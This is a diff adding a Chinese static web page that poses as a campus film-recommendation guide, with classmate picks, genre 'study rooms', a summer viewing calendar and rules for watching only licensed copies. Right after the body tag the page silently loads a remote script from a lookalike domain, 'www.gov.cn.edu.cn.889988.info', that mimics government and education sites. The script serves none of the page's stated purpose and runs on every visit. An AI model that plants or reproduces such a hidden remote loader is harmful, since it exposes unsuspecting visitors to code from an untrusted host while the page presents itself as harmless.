@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>夏同学电影网 - 校园同学片单与正版观影导航</title>
+<meta name="description" content="夏同学电影网（xiatongxuedianyingwang-h5）做校园同学安利：同学精选片单、类型自习室、暑期放映日历与正版观看守则。官方网址：https://xiatongxuedianyingwang-h5.github.io">
+<meta name="keywords" content="夏同学电影网, xiatongxuedianyingwang-h5, 校园电影推荐, 同学片单, 暑期放映日历, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f7fafc;color:#143055;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 320px at 10% 6%, rgba(22,163,74,.12), transparent 55%),
+    radial-gradient(620px 300px at 90% 94%, rgba(29,78,216,.10), transparent 55%),
+    #f7fafc}
+.xc-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(247,250,252,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(20,48,85,.12)}
+.xc-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.xc-nav .logo b{color:#16a34a}
+.xc-nav .logo i{color:#1d4ed8;font-style:normal}
+.xc-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.xc-nav .links a{font-size:13px;color:#33506e;padding:6px 12px;border-radius:20px;transition:.25s}
+.xc-nav .links a:hover{background:rgba(22,163,74,.16);color:#143055}
+
+.hero{padding:54px 20px 42px}
+.chat{max-width:860px;margin:0 auto 18px;display:flex;flex-direction:column;gap:12px}
+.bubble{display:flex;gap:12px;align-items:flex-start;max-width:92%}
+.bubble .ava{width:42px;height:42px;border-radius:50%;flex:0 0 42px;display:flex;align-items:center;justify-content:center;font-size:22px;color:#fff}
+.bubble .ava.a1{background:linear-gradient(135deg,#143055,#1d4ed8)}
+.bubble .ava.a2{background:linear-gradient(135deg,#14532d,#16a34a)}
+.bubble .ava.a3{background:linear-gradient(135deg,#78350f,#facc15);color:#143055}
+.bubble .msg{background:#fff;border:1px solid rgba(20,48,85,.1);border-radius:14px;padding:12px 16px;font-size:14px;color:#33506e;box-shadow:0 8px 22px rgba(20,48,85,.06)}
+.bubble.me{align-self:flex-end;flex-direction:row-reverse}
+.bubble .msg b{color:#16a34a}
+.bubble.me .msg b{color:#1d4ed8}
+
+.timetable{max-width:980px;margin:8px auto 0;background:#143055;border-radius:16px;padding:16px;overflow:hidden}
+.tt-row{display:grid;grid-template-columns:repeat(7,1fr);gap:8px}
+.tt-cell{background:#0f2746;border-radius:10px;padding:10px 8px;text-align:center;color:#dbeafe;font-size:12px}
+.tt-cell .day{font-weight:900;color:#facc15;margin-bottom:4px;font-size:13px}
+.tt-cell .gv{font-size:11px;color:#86efac}
+@media(max-width:680px){.tt-row{grid-template-columns:repeat(2,1fr)}}
+
+.hero h1{font-size:30px;color:#143055;text-align:center;margin:22px 0 12px}
+.hero h1 b{color:#16a34a}
+.hero p.sub{color:#33506e;text-align:center;max-width:660px;margin:0 auto 16px;font-size:15px}
+.hero .url{display:block;width:fit-content;margin:0 auto;font-size:13px;color:#fff;font-weight:800;background:linear-gradient(90deg,#143055,#16a34a);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:16px}
+.chips span{font-size:12px;color:#143055;padding:5px 13px;border-radius:20px;border:1px solid rgba(20,48,85,.18)}
+.chips span:nth-child(1){border-color:#16a34a;color:#14532d}
+.chips span:nth-child(2){border-color:#1d4ed8;color:#1d4ed8}
+.chips span:nth-child(3){border-color:#facc15;color:#78350f}
+
+.wrap{max-width:1160px;margin:0 auto;padding:60px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#1d7a5a;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#143055;margin-bottom:28px}
+.sec-title b{color:#16a34a}
+
+/* 同学片单 */
+.mates{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.mate{background:#fff;border:1px solid rgba(20,48,85,.1);border-radius:14px;overflow:hidden;transition:.3s}
+.mate:hover{transform:translateY(-4px);border-color:#16a34a;box-shadow:0 16px 36px rgba(22,163,74,.12)}
+.mate .top{height:96px;position:relative;display:flex;align-items:flex-end;padding:12px}
+.mate .top.m1{background:linear-gradient(135deg,#143055,#1d4ed8)}
+.mate .top.m2{background:linear-gradient(135deg,#14532d,#16a34a)}
+.mate .top.m3{background:linear-gradient(135deg,#78350f,#facc15)}
+.mate .top.m4{background:linear-gradient(135deg,#0e7490,#22d3ee)}
+.mate .top .who{font-size:12px;font-weight:800;color:#143055;background:#fff;padding:3px 10px;border-radius:20px}
+.mate .top .star{position:absolute;right:12px;top:12px;font-size:12px;color:#143055;background:#facc15;padding:2px 8px;border-radius:12px;font-weight:800}
+.mate .body{padding:16px 18px}
+.mate .body h4{color:#143055;font-size:16px;margin-bottom:4px}
+.mate .body .meta{font-size:12px;color:#1d7a5a;margin-bottom:6px}
+.mate .body p{font-size:13px;color:#33506e;margin:0}
+
+/* 类型自习室 */
+.rooms{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.room{background:#fff;border:1px solid rgba(29,78,216,.16);border-radius:14px;padding:20px;transition:.3s}
+.room:hover{border-color:#16a34a}
+.room .book{font-size:22px;margin-bottom:8px}
+.room h4{color:#143055;font-size:15px;margin-bottom:4px}
+.room p{color:#33506e;font-size:12px;margin:0}
+.room.r1{border-top:3px solid #16a34a}
+.room.r2{border-top:3px solid #1d4ed8}
+.room.r3{border-top:3px solid #facc15}
+.room.r4{border-top:3px solid #0e7490}
+
+/* 暑期日历 */
+.cal{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.week{background:#fff;border-left:4px solid #16a34a;border-radius:12px;padding:20px}
+.week h4{color:#143055;font-size:16px;margin-bottom:6px}
+.week .wd{font-size:12px;color:#1d4ed8;font-weight:800;margin-bottom:6px}
+.week p{color:#33506e;font-size:13px;margin:0}
+.week.w2{border-left-color:#1d4ed8}
+.week.w3{border-left-color:#facc15}
+.week.w4{border-left-color:#0e7490}
+
+/* 正版守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.rule{background:#fff;border:1px solid rgba(22,163,74,.22);border-radius:12px;padding:18px;text-align:center}
+.rule .num{font-size:24px;font-weight:900;color:#16a34a;margin-bottom:6px}
+.rule h4{color:#143055;font-size:14px;margin-bottom:4px}
+.rule p{color:#33506e;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(22,163,74,.24);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(22,163,74,.08),rgba(29,78,216,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#143055;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#16a34a}
+.about p{color:#33506e;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#1d4ed8}
+.about .stats .l{font-size:11px;color:#1d7a5a}
+
+.foot{text-align:center;padding:32px 20px;background:#eef3f8;border-top:1px solid rgba(20,48,85,.12);color:#5b748f;font-size:13px}
+.foot a{color:#16a34a}
+.foot .lg{font-size:18px;font-weight:900;color:#143055;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.xc-nav .links a{font-size:12px;padding:5px 9px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="xc-nav">
+  <div class="logo"><b>夏同学</b>电影网 <i>· 校园安利</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#mates">同学片单</a>
+    <a href="#rooms">类型自习</a>
+    <a href="#cal">暑期日历</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="chat">
+    <div class="bubble"><div class="ava a1">🧑‍🏫</div><div class="msg">夏同学：今晚不知道看啥？先说心情，我按<b>同学口碑+课表</b>给你排。</div></div>
+    <div class="bubble me"><div class="ava a2">🧑‍🎓</div><div class="msg">想轻松一点，别太烧脑，最好<b>合家/校园</b>都能看。</div></div>
+    <div class="bubble"><div class="ava a3">👩‍🎓</div><div class="msg">那走「自习室」筛选：轻喜剧进黄房，自然纪录片进青房，正版平台直接给入口。</div></div>
+  </div>
+
+  <div class="timetable" aria-label="每周放映课表">
+    <div class="tt-row">
+      <div class="tt-cell"><div class="day">周一</div>新片速递<div class="gv">持牌上新</div></div>
+      <div class="tt-cell"><div class="day">周二</div>悬疑自习<div class="gv">社会/本格</div></div>
+      <div class="tt-cell"><div class="day">周三</div>科幻实验室<div class="gv">HDR/4K建议</div></div>
+      <div class="tt-cell"><div class="day">周四</div>剧情读书会<div class="gv">作者/传记</div></div>
+      <div class="tt-cell"><div class="day">周五</div>喜剧释放<div class="gv">轻喜剧合家</div></div>
+      <div class="tt-cell"><div class="day">周六</div>自然户外<div class="gv">纪录片特辑</div></div>
+      <div class="tt-cell"><div class="day">周日</div>同学复盘<div class="gv">高分重看</div></div>
+    </div>
+  </div>
+
+  <h1>夏同学电影网：<b>像同学安利一样</b>挑电影</h1>
+  <p class="sub">把校园口碑、类型自习、暑期课表和正版平台揉成一张导航图。本站不提供未授权在线播放、不写网盘提取码、不引盗版镜像，只做公映/持牌/开放授权建议。</p>
+  <span class="url">🌐 https://xiatongxuedianyingwang-h5.github.io</span>
+  <div class="chips">
+    <span>🗣️ 同学片单</span><span>📚 类型自习室</span><span>🗓️ 暑期日历</span>
+  </div>
+</header>
+
+<main>
+<section id="mates" class="wrap">
+  <div class="kicker">CLASSMATES PICKS</div>
+  <h2 class="sec-title">同学片单 <b>四份安利</b></h2>
+  <div class="mates">
+    <article class="mate"><div class="top m1"><span class="who">班长·新片</span><span class="star">★ 热</span></div><div class="body"><h4>瞬息全宇宙</h4><div class="meta">关家永/丹尼尔·施纳特 · 2022 · 科幻/家庭</div><p>同学反馈“脑洞大但不冷”：多元宇宙夹着母女关系，正版平台标4K/杜比版更稳。</p></div></article>
+    <article class="mate"><div class="top m2"><span class="who">学习委·自然</span><span class="star">★ 静</span></div><div class="body"><h4>地球脉动 I</h4><div class="meta">BBC · 2006 · 自然/纪录片</div><p>山地、洞穴、淡水逐集看，适合自习间隙放松；开放授权版可走图书馆影像库。</p></div></article>
+    <article class="mate"><div class="top m3"><span class="who">文体委·合家</span><span class="star">★ 暖</span></div><div class="body"><h4>寻梦环游记</h4><div class="meta">李·昂克里奇 · 2017 · 动画/家庭</div><p>亡灵节、音乐与亲情，班级观影夜常点；适龄低、正版儿童专区易找。</p></div></article>
+    <article class="mate"><div class="top m4"><span class="who">电教委·悬疑</span><span class="star">★ 烧</span></div><div class="body"><h4>看不见的客人</h4><div class="meta">奥里奥尔·保罗 · 2016 · 悬疑/推理</div><p>同学复盘专用：时间线、口供、反转分层讲，自习室按“本格/社会”双标签归档。</p></div></article>
+  </div>
+</section>
+
+<section id="rooms" class="wrap">
+  <div class="kicker">STUDY ROOMS</div>
+  <h2 class="sec-title">类型自习室 <b>四间</b></h2>
+  <div class="rooms">
+    <div class="room r1"><div class="book">📗</div><h4>剧情/传记房</h4><p>家庭、历史、人物志、作者电影；按地区与年代建卡片，适合写观后笔记。</p></div>
+    <div class="room r2"><div class="book">📘</div><h4>科幻/视觉房</h4><p>硬科幻、太空、赛博、动画奇幻；附HDR/4K与正版平台版本建议。</p></div>
+    <div class="room r3"><div class="book">📙</div><h4>喜剧/合家房</h4><p>校园轻喜剧、动画、亲子、节庆片；标适龄，优先正版家庭专区。</p></div>
+    <div class="room r4"><div class="book">📒</div><h4>悬疑/自然房</h4><p>本格推理、社会派、生态纪录片分架；按烧脑度和观察难度分流。</p></div>
+  </div>
+</section>
+
+<section id="cal" class="wrap">
+  <div class="kicker">SUMMER CALENDAR</div>
+  <h2 class="sec-title">暑期放映日历 <b>四周</b></h2>
+  <div class="cal">
+    <div class="week"><div class="wd">第1周 · 入门</div><h4>新片与轻量</h4><p>院线新片定档、持牌平台上新、轻喜剧打底；不提前放未授权资源。</p></div>
+    <div class="week w2"><div class="wd">第2周 · 深度</div><h4>剧情与传记</h4><p>高分传记、作者电影、历史片共看；标注公映版本与适写观后感。</p></div>
+    <div class="week w3"><div class="wd">第3周 · 视觉</div><h4>科幻与自然</h4><p>科幻特效片配自然纪录片，技术自习讲画质、声音与正版高清档位。</p></div>
+    <div class="week w4"><div class="wd">第4周 · 复盘</div><h4>悬疑与重看</h4><p>烧脑悬疑+同学高分重看；用时间线、人物关系图做小组复盘。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">CAMPUS RULES</div>
+  <h2 class="sec-title">校园正版 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rule"><div class="num">01</div><h4>持牌优先</h4><p>引导持证视频平台、影院重映、官方频道；不内嵌未授权播放器。</p></div>
+    <div class="rule"><div class="num">02</div><h4>公映/授权</h4><p>境内外影片按公映许可、信息网络传播授权核对，不列无资质片源。</p></div>
+    <div class="rule"><div class="num">03</div><h4>开放授权</h4><p>老片修复、纪录片、公有领域片可引图书馆/开放档案，不提供破解文件。</p></div>
+    <div class="rule"><div class="num">04</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/镜像、不用“福利/成人/理论片”暗语分类。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>夏同学电影网 <b>是什么</b></h2>
+      <p>不是“夏同学影院”式在线盗版站，而是一张校园安利导航图：用同学气泡收集口碑、用课表排类型、用自习室做细分、用暑期日历做长线片单。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「校园电影推荐 / 同学片单 / 暑期放映日历 / 类型自习室 / 正版平台看片」。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">4</div><div class="l">同学片单</div></div>
+      <div><div class="n">4</div><div class="l">自习房间</div></div>
+      <div><div class="n">4</div><div class="l">暑期周次</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🎓 夏同学电影网</div>
+  官方网址：<a href="https://xiatongxuedianyingwang-h5.github.io">https://xiatongxuedianyingwang-h5.github.io</a><br>
+  © 2026 夏同学电影网｜同学片单 / 类型自习室 / 暑期放映日历 / 正版观影导航
+</footer>
+
+</body>
+</html>
